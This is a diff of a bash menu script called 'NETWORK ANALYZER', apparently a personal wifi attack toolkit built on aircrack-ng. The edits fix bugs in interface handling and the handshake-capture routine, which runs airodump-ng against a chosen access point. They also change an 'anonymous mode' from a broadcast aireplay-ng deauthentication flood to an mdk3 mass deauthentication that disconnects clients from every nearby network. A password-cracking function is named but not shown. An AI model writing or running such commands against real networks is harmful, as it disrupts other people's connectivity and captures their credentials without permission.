@@ -20,11 +20,11 @@ echo -e "${G}$ '    ███████       █████ █████�
 echo -e "${Y}$ '    ███████        ███████████       ██████         ███████     P       '"
 echo -e "${R}$ '    ███████         ██████████       ██████         ███████     J       '"
 echo -e "${G}$ '                                                                        '"
-echo -e "${Y}$ '                                   NETWORK ANALYZER                   -AZ_SEP '"
+echo -e "${Y}$ '                             NETWORK ANALYZER                   -AZ_SEP '"
 echo -e "${R}$ '^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^'"
 echo -e "${NC}"
 
-#RequiR tools
+#Required tools
 echo -e "${G} _______________${NC}"
 echo -e "${G}|${NC}REQUIR TOOLS:${G}|${NC}"
 echo -e "${G}|${NC}1. ${Y}aircrack-ng ${G}|${NC}"
@@ -38,11 +38,11 @@ echo -e "This tools require ${R}ADMIN${NC} previlge"
 
 # All function with sudo need Admin Permission
 # Array of interfaces names to check
-interfaces=("wlp2s0" "wlan0" "wlan1" "wlan2") # Define your interfaces
+interfaces=("wlp2s0" "wlan0" "wlan1" "wlan2" "lo0") # Define your interfaces
 interfaces_found=0
 
 # Iterate through the array and check if each interfaces exists
-for interfaces in "${interfacess[@]}"; do
+for interfaces in "${interfaces[@]}"; do
     if ip link show "$interfaces" &>/dev/null; then
         echo "WLAN interfaces found: $interfaces"
         interfaces_found=1
@@ -56,9 +56,11 @@ if [ "$interfaces_found" -eq 0 ]; then
 fi
 
 #python server to host the webpage
+#replace gnome-terminal
 gnome-terminal -- python3 server.py
 
 printinfo="Enter any key to exit to main MENU "
+moninfo="This tools required MONITORING MODE"
 
 # Function to enable monitor mode 
 enable_monitor_mode() {
@@ -133,7 +135,6 @@ network_deauthentication() {
         ;;
     esac
 }
-
 # Function for capturing handshake
 capture_handshake() {
     echo"Entering Capturing Mode.."
@@ -154,24 +155,22 @@ capture_handshake() {
             echo "Enter output file name (without extension):"
             read outputfile
             echo "Enter valid details!"
-            sudo airodump-ng -c "$channel" --bssid "$ap_mac" -w "$outputfile" $interfaces #mon requied not not
+            sudo airodump-ng -c "$channel" --bssid "$ap_mac" -w "$outputfile" $interfaces"mon"
         ;;
         2)
             #Scan for Available Networks and Capture Handshake
-            echo "Scanning for available networks..."
-            sudo airmon-ng start $interfaces
-            sudo airodump-ng $interfaces"mon" | tee scan_results.txt
-
+            #echo "Scanning for available networks..."
+            #sudo airmon-ng start $interfaces"mon"
+            sudo airodump-ng $interfaces"mon" #|tee capture_available_net.txt
             #Extract the BSSID and Channel of the Strongest Network
-            bssid=$(grep -o -E "([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})" scan_results.txt | head -n 1)
-            channel=$(grep -o -E "Channel: [0-9]+" scan_results.txt | head -n 1 | cut -d' ' -f2)
-
+            #bssid=$(grep -o -E "([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})" scan_results.txt | head -n 1)
+           # channel=$(grep -o -E "Channel: [0-9]+" scan_results.txt | head -n 1 | cut -d' ' -f2)
             #Capture the Handshake for the Strongest Network
             if [ -n "$bssid" ] && [ -n "$channel" ]; then
                 echo "Capturing handshake for the strongest network..."
                 echo "Output file name (without extension):"
                 read outputfile
-                sudo airodump-ng -c $channel --bssid $bssid -w $outputfile $interfaces
+                sudo airodump-ng -c $channel --bssid $bssid -w $outputfile $interfaces"mon"
             else
                 echo "No networks found. Exiting..."
             fi
@@ -204,9 +203,12 @@ network_monitoring() {
 # Function for anonymous mode
 anonymous_mode() {
     echo "Entering anonymous mode..."
+    echo ""
+    echo "$moninfo"
     echo "Selected $interfaces Network Interface"
+    echo ""
     # Deauthenticate clients from all available networks
-    sudo aireplay-ng --deauth 0 -e "*" -a FF:FF:FF:FF:FF:FF $interface"mon"
+    sudo mdk3 $interfaces"mon" d
     echo "Process completed"
 }
 # Function for password cracking
